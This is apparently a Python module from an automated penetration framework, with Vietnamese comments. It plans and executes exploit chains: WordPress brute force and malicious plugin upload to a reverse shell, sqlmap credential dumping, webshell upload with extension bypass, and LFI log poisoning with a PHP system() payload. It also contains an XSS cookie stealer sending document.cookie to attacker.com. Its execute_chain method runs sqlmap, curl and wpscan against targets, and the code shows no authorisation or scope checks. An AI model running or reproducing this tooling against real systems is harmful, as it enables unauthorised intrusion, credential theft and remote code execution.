"""
ai/chain_planner.py - Exploit Chain Builder
Lên kế hoạch exploit chain dựa trên findings
Ví dụ: user enum → password brute → login → upload plugin → reverse shell
"""

import logging
from typing import Dict, List, Optional
from dataclasses import dataclass, field

from core.executor import run_command  # Thêm import để exec tools

logger = logging.getLogger("recon.chain_planner")


@dataclass
class ExploitStep:
    name: str
    action: str
    target: str
    tool: Optional[str] = None
    payload: Optional[str] = None
    depends_on: List[str] = field(default_factory=list)
    success_indicator: str = ""
    priority: int = 5


@dataclass
class ExploitChain:
    name: str
    description: str
    steps: List[ExploitStep]
    risk_level: str = "HIGH"
    estimated_time: str = "unknown"
    prerequisites: List[str] = field(default_factory=list)


class ChainPlanner:
    """
    Plans exploit chains based on discovered vulnerabilities and findings.
    Prioritizes chains by impact and feasibility.
    """

    def __init__(self, state_manager):
        self.state = state_manager

    def plan_chains_from_graph(self, attack_graph) -> List[ExploitChain]:
        """Plan chains from attack graph analysis"""
        chains = []
        
        # Get top attack chains from graph
        graph_chains = attack_graph.get_top_chains(limit=20)
        
        for chain_data in graph_chains:
            chain = self._build_chain_from_graph_path(chain_data, attack_graph)
            if chain:
                chains.append(chain)
        
        # Add pattern-based chains as fallback
        pattern_chains = self._detect_chain_patterns()
        chains.extend(pattern_chains)
        
        # Smart prioritization
        chains = self.smart_prioritize(chains)
        
        logger.info(f"[CHAIN] Planned {len(chains)} exploit chains from graph")
        return chains

    def _build_chain_from_graph_path(self, chain_data: Dict, attack_graph) -> Optional[ExploitChain]:
        """Build an ExploitChain from a graph path"""
        path = chain_data.get('path', [])
        if len(path) < 2:
            return None
            
        # Get node data
        nodes = []
        for node_id in path:
            node_data = attack_graph.graph.nodes[node_id]
            nodes.append(node_data)
        
        # Build chain name
        start_type = nodes[0].get('vuln_type', 'unknown')
        end_type = nodes[-1].get('vuln_type', 'unknown')
        chain_name = f"{start_type.title()} → {end_type.title()} Chain"
        
        # Build steps
        steps = []
        for i, node in enumerate(nodes):
            step = ExploitStep(
                name=f"Exploit {node.get('name', f'Vuln {i+1}')}",
                action=f"exploit_{node.get('vuln_type', 'unknown')}",
                target=node.get('endpoint', ''),
                tool=self._get_tool_for_vuln_type(node.get('vuln_type', '')),
                success_indicator=f"{node.get('vuln_type', 'unknown')} exploited",
                priority=10 - i  # Decreasing priority
            )
            steps.append(step)
        
        # Calculate risk level
        risk_levels = [node.get('severity', 'MEDIUM') for node in nodes]
        risk_level = 'CRITICAL' if 'CRITICAL' in risk_levels else 'HIGH' if 'HIGH' in risk_levels else 'MEDIUM'
        
        return ExploitChain(
            name=chain_name,
            description=f"Attack chain from {start_type} to {end_type} via {len(path)} steps",
            risk_level=risk_level,
            estimated_time=f"{len(path) * 5}-{len(path) * 15} min",
            prerequisites=[f"{nodes[0].get('vuln_type')} vulnerability"],
            steps=steps
        )

    def _get_tool_for_vuln_type(self, vuln_type: str) -> str:
        """Get appropriate tool for vulnerability type"""
        tool_map = {
            'sqli': 'sqlmap',
            'xss': 'custom_script',
            'rce': 'curl',
            'file_upload': 'curl',
            'lfi': 'curl',
            'auth_bypass': 'curl',
            'csrf': 'curl'
        }
        return tool_map.get(vuln_type.lower(), 'curl')

    def plan_chains(self) -> List[ExploitChain]:
        """Analyze state and build relevant exploit chains"""
        chains = []

        # Detect patterns for chains
        pattern_chains = self._detect_chain_patterns()
        chains.extend(pattern_chains)

        vulns = self.state.get("vulnerabilities", [])
        wp_detected = self.state.get("wordpress_detected", False)

        vulns = self.state.get("vulnerabilities", [])
        wp_detected = self.state.get("wordpress_detected", False)
        wp_users = self.state.get("wp_users", [])
        wp_plugins = self.state.get("wp_plugins", [])
        endpoints = self.state.get("prioritized_endpoints", [])

        # Check for SQLi vulnerabilities
        sqli_vulns = [v for v in vulns if "sql" in v.get("name", "").lower() or
                      v.get("type", "") == "SQLI"]
        if sqli_vulns:
            chains.append(self._build_sqli_chain(sqli_vulns[0]))

        # WordPress chains
        if wp_detected:
            # WP user enumeration → brute → admin access → RCE chain
            if wp_users:
                chains.append(self._build_wp_admin_chain(wp_users))

            # XML-RPC bruteforce chain
            wp_xmlrpc = any(
                "xmlrpc" in f.get("type", "").lower() or "xmlrpc" in f.get("url", "").lower()
                for h_results in [self.state.get("wp_vulns", [])]
                for f in h_results
            )
            if wp_xmlrpc or wp_detected:
                chains.append(self._build_xmlrpc_chain(wp_users))

            # Vulnerable plugin chain
            vuln_plugins = [p for p in wp_plugins if p.get("vulnerabilities")]
            if vuln_plugins:
                chains.append(self._build_wp_plugin_chain(vuln_plugins[0]))

        # File upload chain
        upload_endpoints = [
            ep for ep in endpoints
            if ep.get("score", 0) >= 8 and "upload" in ep.get("url", "").lower()
        ]
        if upload_endpoints:
            chains.append(self._build_upload_chain(upload_endpoints[0]))

        # LFI chain
        lfi_endpoints = [
            ep for ep in endpoints
            if any(r in ep.get("url", "") for r in ["file=", "page=", "include=", "path="])
        ]
        if lfi_endpoints:
            chains.append(self._build_lfi_chain(lfi_endpoints[0]))

        # XSS → Session hijack chain
        xss_vulns = [v for v in vulns if "xss" in v.get("name", "").lower() or
                     "cross-site" in v.get("name", "").lower()]
        if xss_vulns:
            chains.append(self._build_xss_chain(xss_vulns[0]))

        logger.info(f"[CHAIN] Planned {len(chains)} exploit chains")
        for chain in chains:
            logger.info(f"[CHAIN] → [{chain.risk_level}] {chain.name}")

        # Smart prioritization
        chains = self.smart_prioritize(chains)

        return chains

    def smart_prioritize(self, chains: List[ExploitChain]) -> List[ExploitChain]:
        """AI-like prioritization based on impact, feasibility, and state data"""
        for chain in chains:
            score = 0
            # Risk level
            risk_scores = {"CRITICAL": 100, "HIGH": 70, "MEDIUM": 40, "LOW": 10}
            score += risk_scores.get(chain.risk_level, 0)

            # Feasibility: more steps = harder
            score -= len(chain.steps) * 5

            # Target availability
            targets = {s.target for s in chain.steps}
            available_targets = set()
            live_hosts = self.state.get("live_hosts", [])
            for host in live_hosts:
                available_targets.add(host.get("url", ""))
            score += len(targets & available_targets) * 10

            # Vuln confirmation
            vulns = self.state.get("vulnerabilities", [])
            vuln_types = {v.get("name", "").lower() for v in vulns}
            if any(vt in chain.name.lower() for vt in vuln_types):
                score += 20

            chain.priority_score = score

        return sorted(chains, key=lambda c: getattr(c, 'priority_score', 0), reverse=True)

    def execute_chain(self, chain: ExploitChain) -> Dict[str, any]:
        """Execute an exploit chain step by step, respecting dependencies"""
        logger.info(f"[EXEC] Starting chain: {chain.name}")
        results = {"chain": chain.name, "steps_executed": [], "success": False, "final_payload": None}

        # Check prerequisites
        if not self._check_prerequisites(chain.prerequisites):
            logger.warning(f"[EXEC] Prerequisites not met for {chain.name}")
            return results

        executed_steps = set()
        for step in sorted(chain.steps, key=lambda s: s.priority, reverse=True):
            # Check dependencies
            if step.depends_on and not all(dep in executed_steps for dep in step.depends_on):
                logger.info(f"[EXEC] Skipping {step.name} - dependencies not met")
                continue

            logger.info(f"[EXEC] Executing step: {step.name}")
            step_result = self._execute_step(step)
            results["steps_executed"].append({"step": step.name, "result": step_result})

            if step_result.get("success"):
                executed_steps.add(step.name)
                if step.name == chain.steps[-1].name:  # Last step
                    results["success"] = True
                    results["final_payload"] = step_result.get("output")
            else:
                logger.warning(f"[EXEC] Step {step.name} failed, aborting chain")
                break

        return results

    def _check_prerequisites(self, prereqs: List[str]) -> bool:
        """Check if prerequisites are met based on state"""
        for prereq in prereqs:
            if "WordPress" in prereq:
                if not self.state.get("wordpress_detected"):
                    return False
            elif "SQLi" in prereq:
                vulns = self.state.get("vulnerabilities", [])
                if not any("sql" in v.get("name", "").lower() for v in vulns):
                    return False
            # Add more checks as needed
        return True

    def _execute_step(self, step: ExploitStep) -> Dict[str, any]:
        """Execute a single step using appropriate tool"""
        result = {"success": False, "output": "", "error": ""}

        try:
            if step.tool == "sqlmap":
                cmd = ["sqlmap", "-u", step.target, "--batch", "--level=5", "--risk=3"]
                if step.payload:
                    cmd.extend(step.payload.split())
                ret, out, err = run_command(cmd, timeout=600)
                result["success"] = ret == 0 and step.success_indicator in out
                result["output"] = out
                result["error"] = err

            elif step.tool == "curl":
                cmd = ["curl", "-s", step.target]
                if step.payload:
                    cmd.extend(["-d", step.payload])
                ret, out, err = run_command(cmd, timeout=60)
                result["success"] = step.success_indicator in out if step.success_indicator else ret == 0
                result["output"] = out
                result["error"] = err

            elif step.tool == "wpscan":
                cmd = ["wpscan", "--url", step.target, "--enumerate", "u"]
                if step.payload:
                    cmd.extend(step.payload.split())
                ret, out, err = run_command(cmd, timeout=300)
                result["success"] = step.success_indicator in out if step.success_indicator else ret == 0
                result["output"] = out
                result["error"] = err

            # Add more tool executions as needed
            else:
                logger.warning(f"[EXEC] Tool {step.tool} not implemented yet")
                result["error"] = f"Tool {step.tool} not supported"

        except Exception as e:
            result["error"] = str(e)

        return result

    def _build_wp_admin_chain(self, users: List[str]) -> ExploitChain:
        """WordPress: enumerate → brute → wp-admin → plugin upload → RCE"""
        primary_user = users[0] if users else "admin"

        return ExploitChain(
            name="WordPress Admin Takeover → RCE",
            description="Bruteforce WP credentials, log in as admin, upload malicious plugin for RCE",
            risk_level="CRITICAL",
            estimated_time="15-60 min",
            prerequisites=["WordPress detected", "Login page accessible"],
            steps=[
                ExploitStep(
                    name="User Enumeration",
                    action="enumerate_wp_users",
                    target="wp-json/wp/v2/users",
                    tool="curl",
                    success_indicator="user list extracted",
                    priority=10,
                ),
                ExploitStep(
                    name="Password Bruteforce",
                    action="bruteforce_wp_login",
                    target="wp-login.php",
                    tool="wpscan/hydra",
                    payload=f"username={primary_user}",
                    depends_on=["User Enumeration"],
                    success_indicator="valid credentials found",
                    priority=9,
                ),
                ExploitStep(
                    name="Admin Login",
                    action="login_wp_admin",
                    target="wp-admin/",
                    tool="curl/browser",
                    depends_on=["Password Bruteforce"],
                    success_indicator="admin dashboard accessible",
                    priority=8,
                ),
                ExploitStep(
                    name="Plugin Upload",
                    action="upload_malicious_plugin",
                    target="wp-admin/plugin-install.php",
                    tool="curl",
                    payload="malicious_plugin.zip",
                    depends_on=["Admin Login"],
                    success_indicator="plugin activated",
                    priority=7,
                ),
                ExploitStep(
                    name="Reverse Shell",
                    action="trigger_reverse_shell",
                    target="wp-content/plugins/malicious/shell.php",
                    tool="nc",
                    payload="cmd=id",
                    depends_on=["Plugin Upload"],
                    success_indicator="shell connection established",
                    priority=6,
                ),
            ]
        )

    def _build_xmlrpc_chain(self, users: List[str]) -> ExploitChain:
        """XML-RPC multicall bruteforce"""
        return ExploitChain(
            name="XML-RPC Multicall Bruteforce",
            description="Abuse XML-RPC system.multicall to test many passwords at once",
            risk_level="HIGH",
            estimated_time="5-20 min",
            prerequisites=["xmlrpc.php accessible"],
            steps=[
                ExploitStep(
                    name="Verify XML-RPC",
                    action="check_xmlrpc",
                    target="xmlrpc.php",
                    tool="curl",
                    payload="system.listMethods",
                    success_indicator="methodResponse received",
                    priority=10,
                ),
                ExploitStep(
                    name="Multicall Bruteforce",
                    action="xmlrpc_multicall",
                    target="xmlrpc.php",
                    tool="custom_script",
                    payload="wp.getUsersBlogs multicall",
                    depends_on=["Verify XML-RPC"],
                    success_indicator="valid credentials in response",
                    priority=9,
                ),
            ]
        )

    def _build_sqli_chain(self, vuln: Dict) -> ExploitChain:
        """SQL injection → data exfil → possible auth bypass"""
        return ExploitChain(
            name="SQL Injection → Data Exfiltration",
            description="Exploit SQLi to dump credentials and sensitive data",
            risk_level="CRITICAL",
            estimated_time="10-30 min",
            prerequisites=["SQLi vulnerability found"],
            steps=[
                ExploitStep(
                    name="Confirm SQLi",
                    action="test_sqli",
                    target=vuln.get("url", ""),
                    tool="sqlmap",
                    payload="' OR '1'='1",
                    success_indicator="SQL error or boolean difference detected",
                    priority=10,
                ),
                ExploitStep(
                    name="Database Enumeration",
                    action="enumerate_databases",
                    target=vuln.get("url", ""),
                    tool="sqlmap",
                    payload="--dbs",
                    depends_on=["Confirm SQLi"],
                    success_indicator="database list extracted",
                    priority=9,
                ),
                ExploitStep(
                    name="Dump Credentials",
                    action="dump_users_table",
                    target=vuln.get("url", ""),
                    tool="sqlmap",
                    payload="--dump -T users",
                    depends_on=["Database Enumeration"],
                    success_indicator="credentials dumped",
                    priority=8,
                ),
                ExploitStep(
                    name="Auth Bypass",
                    action="try_extracted_credentials",
                    target="login page",
                    tool="curl",
                    depends_on=["Dump Credentials"],
                    success_indicator="authenticated successfully",
                    priority=7,
                ),
            ]
        )

    def _build_upload_chain(self, endpoint: Dict) -> ExploitChain:
        """File upload → webshell → RCE"""
        return ExploitChain(
            name="File Upload → Webshell → RCE",
            description="Bypass file upload restrictions to deploy a webshell",
            risk_level="CRITICAL",
            estimated_time="5-20 min",
            prerequisites=["File upload endpoint found"],
            steps=[
                ExploitStep(
                    name="Test Upload",
                    action="upload_benign_file",
                    target=endpoint.get("url", ""),
                    tool="curl",
                    payload="test.txt",
                    success_indicator="upload successful",
                    priority=10,
                ),
                ExploitStep(
                    name="Bypass Extension Filter",
                    action="upload_php_double_ext",
                    target=endpoint.get("url", ""),
                    tool="curl",
                    payload="shell.php.jpg",
                    depends_on=["Test Upload"],
                    success_indicator="file accepted",
                    priority=9,
                ),
                ExploitStep(
                    name="Execute Webshell",
                    action="trigger_webshell",
                    target="uploads/shell.php",
                    tool="curl",
                    payload="?cmd=id",
                    depends_on=["Bypass Extension Filter"],
                    success_indicator="command output received",
                    priority=8,
                ),
            ]
        )

    def _build_lfi_chain(self, endpoint: Dict) -> ExploitChain:
        """LFI → log poisoning → RCE"""
        return ExploitChain(
            name="LFI → Log Poisoning → RCE",
            description="Exploit LFI to read sensitive files, then poison logs for RCE",
            risk_level="HIGH",
            estimated_time="15-45 min",
            prerequisites=["LFI parameter found"],
            steps=[
                ExploitStep(
                    name="Confirm LFI",
                    action="test_lfi",
                    target=endpoint.get("url", ""),
                    payload="../../../../etc/passwd",
                    success_indicator="passwd file content in response",
                    priority=10,
                ),
                ExploitStep(
                    name="Read Config Files",
                    action="read_config",
                    target=endpoint.get("url", ""),
                    payload="../../../../var/www/html/config.php",
                    depends_on=["Confirm LFI"],
                    success_indicator="database credentials found",
                    priority=9,
                ),
                ExploitStep(
                    name="Log Poisoning",
                    action="inject_php_in_logs",
                    target="User-Agent header",
                    payload="<?php system($_GET['cmd']); ?>",
                    depends_on=["Confirm LFI"],
                    success_indicator="PHP code in logs",
                    priority=8,
                ),
                ExploitStep(
                    name="Execute via LFI",
                    action="include_poisoned_log",
                    target=endpoint.get("url", ""),
                    payload="../../../../var/log/apache2/access.log&cmd=id",
                    depends_on=["Log Poisoning"],
                    success_indicator="RCE achieved",
                    priority=7,
                ),
            ]
        )

    def _build_xss_chain(self, vuln: Dict) -> ExploitChain:
        """XSS → session hijack → account takeover"""
        return ExploitChain(
            name="XSS → Session Hijack → Account Takeover",
            description="Use stored/reflected XSS to steal admin session cookies",
            risk_level="HIGH",
            estimated_time="30-120 min",
            prerequisites=["XSS vulnerability found"],
            steps=[
                ExploitStep(
                    name="Confirm XSS",
                    action="test_xss",
                    target=vuln.get("url", ""),
                    payload="<script>alert(1)</script>",
                    success_indicator="alert triggered",
                    priority=10,
                ),
                ExploitStep(
                    name="Setup Cookie Collector",
                    action="start_listener",
                    target="attacker server",
                    tool="nc/python",
                    success_indicator="server listening",
                    priority=9,
                ),
                ExploitStep(
                    name="Inject Cookie Stealer",
                    action="inject_cookie_stealer",
                    target=vuln.get("url", ""),
                    payload="<script>document.location='http://attacker.com/?c='+document.cookie</script>",
                    depends_on=["Setup Cookie Collector"],
                    success_indicator="admin visits page",
                    priority=8,
                ),
                ExploitStep(
                    name="Session Replay",
                    action="use_stolen_session",
                    target="admin panel",
                    tool="browser/curl",
                    depends_on=["Inject Cookie Stealer"],
                    success_indicator="admin access achieved",
                    priority=7,
                ),
            ]
        )

    def _build_wp_plugin_chain(self, plugin: Dict) -> ExploitChain:
        """Exploit vulnerable WordPress plugin"""
        plugin_name = plugin.get("name", "unknown")
        vulns = plugin.get("vulnerabilities", [])
        vuln_type = vulns[0].get("type", "unknown") if vulns else "unknown"

        return ExploitChain(
            name=f"WordPress Plugin Exploit: {plugin_name}",
            description=f"Exploit {vuln_type} vulnerability in plugin {plugin_name}",
            risk_level="CRITICAL" if "RCE" in vuln_type else "HIGH",
            estimated_time="5-15 min",
            prerequisites=[f"Plugin {plugin_name} installed and active"],
            steps=[
                ExploitStep(
                    name="Confirm Plugin Version",
                    action="check_plugin_version",
                    target=f"wp-content/plugins/{plugin_name}/readme.txt",
                    success_indicator="vulnerable version confirmed",
                    priority=10,
                ),
                ExploitStep(
                    name="Send Exploit Payload",
                    action="exploit_plugin_vuln",
                    target=f"wp-content/plugins/{plugin_name}/",
                    tool="curl/metasploit",
                    payload=f"{vuln_type} payload",
                    depends_on=["Confirm Plugin Version"],
                    success_indicator="exploit successful",
                    priority=9,
                ),
            ]
        )

    def combine_chains(self, chains: List[ExploitChain]) -> List[ExploitChain]:
        """Intelligently combine overlapping chains for higher impact"""
        combined = []
        used = set()

        for i, chain1 in enumerate(chains):
            if i in used:
                continue
            combined_chain = chain1
            for j, chain2 in enumerate(chains):
                if j <= i or j in used:
                    continue
                if self._chains_overlap(chain1, chain2):
                    combined_chain = self._merge_chains(chain1, chain2)
                    used.add(j)
            combined.append(combined_chain)
            used.add(i)

        logger.info(f"[CHAIN] Combined into {len(combined)} chains")
        return combined

    def _chains_overlap(self, c1: ExploitChain, c2: ExploitChain) -> bool:
        """Check if two chains share common targets or vulns"""
        c1_targets = {s.target for s in c1.steps}
        c2_targets = {s.target for s in c2.steps}
        return bool(c1_targets & c2_targets) or c1.name.split("→")[0] == c2.name.split("→")[0]

    def _merge_chains(self, c1: ExploitChain, c2: ExploitChain) -> ExploitChain:
        """Merge two chains into one with combined steps"""
        merged_steps = c1.steps + [s for s in c2.steps if s not in c1.steps]
        return ExploitChain(
            name=f"{c1.name} + {c2.name}",
            description=f"Combined: {c1.description} + {c2.description}",
            risk_level="CRITICAL" if "CRITICAL" in [c1.risk_level, c2.risk_level] else "HIGH",
            estimated_time=f"{c1.estimated_time} + {c2.estimated_time}",
            prerequisites=list(set(c1.prerequisites + c2.prerequisites)),
            steps=merged_steps
        )

    def _detect_chain_patterns(self) -> List[ExploitChain]:
        """Detect exploit chain patterns from endpoints and vulns"""
        chains = []
        endpoints = self.state.get("prioritized_endpoints", [])
        vulns = self.state.get("vulnerabilities", [])

        # Pattern: Upload + Admin = RCE
        upload_eps = [e for e in endpoints if "upload" in e.get("categories", [])]
        admin_eps = [e for e in endpoints if "admin" in e.get("categories", [])]
        if upload_eps and admin_eps:
            chains.append(self._build_upload_admin_chain(upload_eps[0], admin_eps[0]))

        # Pattern: Auth bypass + Admin access
        auth_vulns = [v for v in vulns if "auth" in v.get("name", "").lower() or "bypass" in v.get("name", "").lower()]
        if auth_vulns and admin_eps:
            chains.append(self._build_auth_bypass_chain(auth_vulns[0], admin_eps[0]))

        # Pattern: LFI + Log poisoning
        lfi_vulns = [v for v in vulns if "lfi" in v.get("name", "").lower()]
        if lfi_vulns:
            chains.append(self._build_lfi_log_poison_chain(lfi_vulns[0]))

        return chains

    def _build_upload_admin_chain(self, upload_ep: Dict, admin_ep: Dict) -> ExploitChain:
        return ExploitChain(
            name="Upload → Admin Access → RCE",
            description="Upload malicious file, gain admin access, execute RCE",
            risk_level="CRITICAL",
            estimated_time="10-30 min",
            prerequisites=["Upload endpoint", "Admin panel"],
            steps=[
                ExploitStep(name="Upload Shell", action="upload_webshell", target=upload_ep["url"], tool="curl", payload="shell.php"),
                ExploitStep(name="Access Admin", action="login_admin", target=admin_ep["url"], tool="curl", depends_on=["Upload Shell"]),
                ExploitStep(name="Execute RCE", action="trigger_shell", target="uploaded_shell.php", tool="curl", depends_on=["Access Admin"], payload="?cmd=id"),
            ]
        )

    def _build_auth_bypass_chain(self, vuln: Dict, admin_ep: Dict) -> ExploitChain:
        return ExploitChain(
            name="Auth Bypass → Admin Takeover",
            description="Bypass authentication to access admin panel",
            risk_level="HIGH",
            estimated_time="5-15 min",
            prerequisites=["Auth vulnerability", "Admin endpoint"],
            steps=[
                ExploitStep(name="Bypass Auth", action="exploit_auth_bypass", target=vuln["url"], tool="curl"),
                ExploitStep(name="Access Admin", action="enter_admin", target=admin_ep["url"], tool="curl", depends_on=["Bypass Auth"]),
            ]
        )

    def _build_lfi_log_poison_chain(self, vuln: Dict) -> ExploitChain:
        return ExploitChain(
            name="LFI → Log Poisoning → RCE",
            description="Use LFI to read logs, poison logs for RCE",
            risk_level="HIGH",
            estimated_time="15-45 min",
            prerequisites=["LFI vulnerability"],
            steps=[
                ExploitStep(name="Read Logs", action="read_log_file", target=vuln["url"], tool="curl", payload="../../../../var/log/apache2/access.log"),
                ExploitStep(name="Poison Log", action="inject_log", target="target.com", tool="curl", payload="<?php system($_GET['cmd']); ?>"),
                ExploitStep(name="Execute RCE", action="trigger_rce", target=vuln["url"], tool="curl", depends_on=["Poison Log"], payload="?file=../../../var/log/apache2/access.log&cmd=id"),
            ]
        )

    def format_chain_report(self, chains: List[ExploitChain]) -> str:
        """Format chains into readable report"""
        lines = [
            "=" * 60,
            "  EXPLOIT CHAIN ANALYSIS",
            "=" * 60,
            f"  {len(chains)} exploit chains identified",
            "",
        ]

        for i, chain in enumerate(chains, 1):
            lines.extend([
                f"[{i}] {chain.name}",
                f"    Risk Level : {chain.risk_level}",
                f"    Est. Time  : {chain.estimated_time}",
                f"    Steps      : {len(chain.steps)}",
                f"    Description: {chain.description}",
                "",
                "    STEPS:",
            ])
            for j, step in enumerate(chain.steps, 1):
                lines.append(f"    {j}. {step.name}")
                lines.append(f"       Action : {step.action}")
                if step.tool:
                    lines.append(f"       Tool   : {step.tool}")
                if step.payload:
                    lines.append(f"       Payload: {step.payload[:60]}")
                lines.append(f"       Success: {step.success_indicator}")
            lines.append("=" * 60)

        return "\n".join(lines)